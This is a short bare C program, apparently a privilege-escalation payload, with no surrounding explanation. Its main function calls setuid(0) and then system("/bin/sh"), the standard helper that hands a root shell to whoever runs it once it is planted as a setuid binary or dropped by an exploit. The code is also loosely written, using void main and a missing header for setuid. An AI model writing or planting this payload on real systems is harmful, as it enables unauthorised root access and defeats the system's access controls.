#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void main() {
    setuid(0);  system("/bin/sh");
  }
